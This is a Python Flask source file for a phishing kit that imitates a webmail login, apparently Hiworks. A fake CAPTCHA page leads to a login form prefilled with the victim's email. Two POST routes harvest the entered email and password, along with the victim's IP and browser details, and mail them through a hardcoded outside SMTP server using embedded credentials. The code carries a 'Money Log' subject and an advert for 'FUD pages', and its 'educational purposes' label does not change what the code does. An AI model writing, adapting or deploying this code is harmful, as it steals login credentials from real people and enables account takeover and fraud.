from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
import secrets
import random
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Made for educational purposes only

app = Flask(__name__)
secret_keyx = secrets.token_urlsafe(24)
app.secret_key = secret_keyx


@app.route('/m', methods=['GET', 'POST'])
def captcha():
    if request.method == 'GET':
        if 'passed_captcha' in session and session['passed_captcha']:
            # CAPTCHA has already been passed, redirect to success page
            return redirect(url_for('success'))

        # Generate a random 4-digit code
        code = random.randint(1000, 9999)
        colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
        color = random.choice(colors)
        session['code'] = str(code)
        userauto = request.args.get("web")
        userdomain = userauto[userauto.index('@') + 1:]
        session['eman'] = userauto
        session['ins'] = userdomain
        return render_template('captcha.html', code=code, color=color, eman=userauto, ins=userdomain, error=False)

    elif request.method != 'GET':
        user_input = request.form['code']

        if user_input == session['code']:
            # User input matches the code, set the flag and redirect to success page
            session['passed_captcha'] = True
            return redirect(url_for('success'))
        else:
            # User input does not match the code, generate a new code and render the CAPTCHA page with an error message
            code = random.randint(1000, 9999)
            colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
            color = random.choice(colors)
            session['code'] = str(code)

            return render_template('captcha.html', code=code, color=color, error=True)


@app.route('/success')
def success():
    if 'passed_captcha' in session and session['passed_captcha']:
        web_param = request.args.get('web')
        return redirect(url_for('route2', web=web_param))
    else:
        return redirect(url_for('captcha'))


@app.route("/")
def route2():
    web_param = request.args.get('web')
    if web_param:
        session['eman'] = web_param
        session['ins'] = web_param[web_param.index('@') + 1:]
    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))


@app.route("/first", methods=['POST'])
def first():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or \
            request.headers.get('X-Client-IP') or request.remote_addr

        email = request.form.get("horse")
        passwordemail = request.form.get("pig")
        sender_email = "auto528@ecofuture.bio"
        sender_emaill = "auto528"
        receiver_email = "miriam.adelson@clubmember.org"
        password = "vipb2b84382e351"
        useragent = request.headers.get('User-Agent')

        message = MIMEMultipart("alternative")
        message["Subject"] = "Hiworks Money Log"
        message["From"] = sender_email
        message["To"] = receiver_email

        text = "Hi,\nHow are you?\nContact me on ICQ James Cartwright for your FUD pages."
        html = render_template(
            'emailmailer.html',
            emailaccess=email,
            useragent=useragent,
            passaccess=passwordemail,
            ipman=ip
        )

        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)

        with smtplib.SMTP("62.106.66.84", 6040) as server:
            server.login(sender_emaill, password)
            server.sendmail(sender_email, receiver_email, message.as_string())

        return redirect(url_for('benza', web=session.get('eman')))


@app.route("/second", methods=['POST'])
def second():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or \
            request.headers.get('X-Client-IP') or request.remote_addr

        email = request.form.get("horse")
        passwordemail = request.form.get("pig")
        sender_email = "auto528@ecofuture.bio"
        sender_emaill = "auto528"
        receiver_email = "miriam.adelson@clubmember.org"
        password = "vipb2b84382e351"
        useragent = request.headers.get('User-Agent')

        message = MIMEMultipart("alternative")
        message["Subject"] = "Hiworks Money Log 2"
        message["From"] = sender_email
        message["To"] = receiver_email

        text = "Hi,\nHow are you?\nContact me on ICQ James Cartwright for your FUD pages."
        html = render_template(
            'emailmailer.html',
            emailaccess=email,
            useragent=useragent,
            passaccess=passwordemail,
            ipman=ip
        )

        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)

        with smtplib.SMTP("62.106.66.84", 6040) as server:
            server.login(sender_emaill, password)
            server.sendmail(sender_email, receiver_email, message.as_string())

        return redirect(url_for('lasmo', web=session.get('eman')))


@app.route("/benzap", methods=['GET'])
def benza():
    if request.method == 'GET':
        eman = session.get('eman')
        dman = session.get('ins')
    return render_template('ind.html', eman=eman, dman=dman)


@app.route("/lasmop", methods=['GET'])
def lasmo():
    userip = request.headers.get("X-Forwarded-For")
    useragent = request.headers.get("User-Agent")
    if request.method == 'GET':
        dman = session.get('ins')
    return render_template('main.html', dman=dman)


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=3000)
